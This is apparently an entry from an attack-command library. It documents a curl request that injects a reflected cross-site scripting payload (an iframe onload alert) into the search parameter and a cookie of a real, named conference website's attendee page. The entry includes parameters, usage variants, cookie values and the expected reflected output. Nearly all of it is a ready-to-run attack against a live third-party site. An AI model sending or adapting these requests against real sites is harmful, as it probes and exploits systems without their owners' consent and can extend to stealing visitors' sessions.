---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: send-xss-get-request
type: command
executor: bash
data: >-
  curl -X GET
  "https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E"
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101
  Firefox/49.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H
  "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H
  "Cookie: __cfduid=d0206c15456d3dc6ff974f786972dd1e21475340728;
  UTMvalues=?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E%5Dvisited=yes;
  _gu=79b8b070-b65b-4988-9808-72c0c3f009d1;
  _gw=2.u[~0,~0,~0,~0,~0]v[~enka0,~1,~0]a(3341-30024717~102t); _gs=2.s();
  intercom-id-h2ooummb=c763a234-9283-447e-9919-48808090f3b5" -H "Connection:
  keep-alive" -H "Upgrade-Insecure-Requests: 1"
output: >-
  HTML response with reflected payload in script tag, triggering JS execution
  when loaded in browser
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:16:30.610Z'
platforms:
  - Linux
  - Web
tags:
  - xss
  - http-request
  - curl
verified: false
validated: true
submitted: true
---

# send-xss-get-request

## Command

```bash
curl -X GET "https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Cookie: __cfduid=d0206c15456d3dc6ff974f786972dd1e21475340728; UTMvalues=?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E%5Dvisited=yes; _gu=79b8b070-b65b-4988-9808-72c0c3f009d1; _gw=2.u[~0,~0,~0,~0,~0]v[~enka0,~1,~0]a(3341-30024717~102t); _gs=2.s(); intercom-id-h2ooummb=c763a234-9283-447e-9919-48808090f3b5" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1"
```

## Description

This command sends a crafted HTTP GET request to the WebSummit attendees page with a URL-encoded XSS payload in the 'q' parameter, exploiting reflective XSS by injecting into a script tag's data-url attribute. Use it to test and demonstrate the vulnerability in a controlled environment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `URL` | Target endpoint with payload in q param | Yes |
| `-H "User-Agent: ..."` | Mimics Firefox 49.0 browser | Yes |
| `-H "Accept: ..."` | Specifies accepted content types | Yes |
| `-H "Cookie: ..."` | Includes session and tracking cookies for authenticity | Yes |
| `-H "Connection: keep-alive"` | Maintains persistent connection | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"
```

### Advanced Usage

```bash
curl -X GET "https://websummit.net/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0" -H "Cookie: __cfduid=..." --verbose
```

## Expected Output

A successful response includes HTTP 200 OK with HTML body containing the reflected payload, such as: <script id="fa-list" class='api-json' data-target='#attendees' data-url='https://api.cilabs.net/v1/conferences/ws16/info/attendees?limit=25&q=rubyoob'><iframe/onload=alert(document.domain)></iframe>. When viewed in a browser, it triggers a JavaScript alert.

## Related

- [[Related Procedure|procedures/Exploit-Reflective-XSS-in-Search-Parameter]]
